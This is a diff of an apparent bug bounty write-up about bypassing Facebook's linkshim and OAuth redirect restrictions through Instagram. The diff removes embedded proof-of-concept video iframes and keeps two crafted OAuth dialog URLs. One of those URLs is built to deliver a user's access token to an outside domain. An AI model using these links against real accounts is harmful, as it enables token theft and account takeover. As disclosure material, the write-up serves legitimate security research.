@@ -24,10 +24,6 @@ Oauth bypass url :
 >https://www.facebook.com/v2.2/dialog/oauth?client_id=1672090479675902&redirect_uri=http%3A%2F%2Fl.instagram.com%2F%3Fe%3DATNqsDRx0x7ZVfVF282iVvW4zr6QOhmME_M35bNw6rHrt6L30ajQ2t-YStDi6g%26u%3Dhttp%3A%2F%2Fgoogle.com%2F&scope=public_profile%2Cemail&response_type=code
 
 
-Proof of concept : 
-
-<iframe src="https://drive.google.com/file/d/0BycKB4yADa3bZk4zMU9TdUFQMzg/preview" width="640" height="480"></iframe>
-
 
 Code it self can't do any thing without `client_secret` and same redirect url (instagrampartners.com) is required for explict authentication from server side.
 Linkshim was not allowing url fragments. When `response_type` is set to `token`, It returns in the form of fragment. So anything
@@ -36,9 +32,5 @@ after `#` is negelected by linkshim. I used oauth to bypass the restrictions by 
 Oauth bypass url using oauth :
 
 >https://www.facebook.com/v2.2/dialog/oauth?client_id=1672090479675902&scope=public_profile%2Cemail&response_type=token&redirect_uri=https%3A%2F%2Fwww.instagram.com%2Foauth%2Fauthorize%2F%3Fclient_id%3D{REDACTED}%26response_type%3Dcode%26redirect_uri%3Dhttp%3A%2F%2Fmunchinng.com%2F%26state%3D
-
-Proof of concept :
-
-<iframe src="https://drive.google.com/file/d/0BycKB4yADa3bZTJEdmtIc1lMUDA/preview" width="640" height="480"></iframe>
 
 
